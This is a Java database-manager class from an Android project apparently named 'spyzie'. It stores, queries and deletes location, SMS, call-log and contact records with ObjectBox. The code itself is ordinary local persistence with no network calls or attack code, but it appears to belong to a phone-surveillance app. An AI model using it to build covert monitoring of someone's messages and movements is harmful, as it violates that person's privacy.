package com.tantd.spyzie.data.db;

import android.util.Log;

import com.tantd.spyzie.data.model.Call;
import com.tantd.spyzie.data.model.Call_;
import com.tantd.spyzie.data.model.Contact;
import com.tantd.spyzie.data.model.Contact_;
import com.tantd.spyzie.data.model.Location;
import com.tantd.spyzie.data.model.Location_;
import com.tantd.spyzie.data.model.Sms;
import com.tantd.spyzie.data.model.Sms_;
import com.tantd.spyzie.util.Constants;

import java.util.Collection;
import java.util.Collections;
import java.util.List;

import io.objectbox.Box;
import io.objectbox.query.Query;

/**
 * Created by tantd on 4/9/2020.
 */
public class AppDbManager implements DbManager {

    private static final String DEBUG_SUB_TAG = "[" + AppDbManager.class.getSimpleName() + "] ";

    private static AppDbManager instance;

    private Box<Location> mLocationBox;
    private Box<Sms> mSmsBox;
    private Box<Call> mCallBox;
    private Box<Contact> mContactBox;
    private Query<Location> mLocationQuery;
    private Query<Sms> mSmsQuery;
    private Query<Call> mCallQuery;
    private Query<Contact> mContactQuery;

    public static synchronized AppDbManager getInstance() {
        if (instance == null) {
            instance = new AppDbManager();
        }
        return instance;
    }

    private AppDbManager() {
        mLocationBox = ObjectBox.get().boxFor(Location.class);
        mSmsBox = ObjectBox.get().boxFor(Sms.class);
        mCallBox = ObjectBox.get().boxFor(Call.class);
        mContactBox = ObjectBox.get().boxFor(Contact.class);

        mLocationQuery = mLocationBox.query().order(Location_._id).build();
        mSmsQuery = mSmsBox.query().order(Sms_._id).build();
        mCallQuery = mCallBox.query().order(Call_._id).build();
        mContactQuery = mContactBox.query().order(Contact_._id).build();
    }

    @Override
    public <T> void put(T t) {
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG + "A", DEBUG_SUB_TAG + "put, t=" + t);
        }
        if (t instanceof Location) {
            mLocationBox.put((Location) t);
        } else if (t instanceof Sms) {
            mSmsBox.put((Sms) t);
        } else if (t instanceof Call) {
            mCallBox.put((Call) t);
        } else if (t instanceof Contact) {
            mContactBox.put((Contact) t);
        }
    }

    @Override
    public void putLocations(Collection<Location> locations) {
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "putLocations, size=" + locations.size());
        }
        mLocationBox.put(locations);
    }

    @Override
    public List<?> findAll(Class<?> tClass) {
        List<?> result = Collections.EMPTY_LIST;
        if (Location.class.equals(tClass)) {
            result = mLocationQuery.find();
        } else if (Sms.class.equals(tClass)) {
            result = mSmsQuery.find();
        } else if (Call.class.equals(tClass)) {
            result = mCallQuery.find();
        } else if (Contact.class.equals(tClass)) {
            result = mContactQuery.find();
        }
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "findAll, tClass=" + tClass + ", result count=" + result.size());
        }
        return result;
    }

    @Override
    public List<?> find(Class<?> tClass, long offset, long limit) {
        List<?> result = Collections.EMPTY_LIST;
        if (Location.class.equals(tClass)) {
            result = mLocationQuery.find(offset, limit);
        } else if (Sms.class.equals(tClass)) {
            result = mSmsQuery.find(offset, limit);
        } else if (Call.class.equals(tClass)) {
            result = mCallQuery.find(offset, limit);
        } else if (Contact.class.equals(tClass)) {
            result = mContactQuery.find(offset, limit);
        }
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "find, tClass=" + tClass + ", offset=" + offset + ", limit=" + limit
                    + ", result count=" + result.size());
        }
        return result;
    }

    @Override
    public void removeAll(Class<?> tClass) {
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "removeAll, tClass=" + tClass);
        }
        if (Location.class.equals(tClass)) {
            mLocationBox.removeAll();
        } else if (Sms.class.equals(tClass)) {
            mSmsBox.removeAll();
        } else if (Call.class.equals(tClass)) {
            mCallBox.removeAll();
        } else if (Contact.class.equals(tClass)) {
            mContactBox.removeAll();
        }
    }

    @Override
    public void removeLocations(Collection<Location> locations) {
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG + "A", DEBUG_SUB_TAG + "removeLocations, count=" + locations.size());
        }
        if (locations.size() > 0) {
            mLocationBox.remove(locations);
        }
    }

    @Override
    public void removeSms(Collection<Sms> sms) {
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "removeSms, count=" + sms.size());
        }
        if (sms.size() > 0) {
            mSmsBox.remove(sms);
        }
    }

    @Override
    public void removeCalls(Collection<Call> calls) {
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "removeCalls, count=" + calls.size());
        }
        if (calls.size() > 0) {
            mCallBox.remove(calls);
        }
    }

    @Override
    public void removeContacts(Collection<Contact> contacts) {
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "removeContacts, count=" + contacts.size());
        }
        if (contacts.size() > 0) {
            mContactBox.remove(contacts);
        }
    }
}
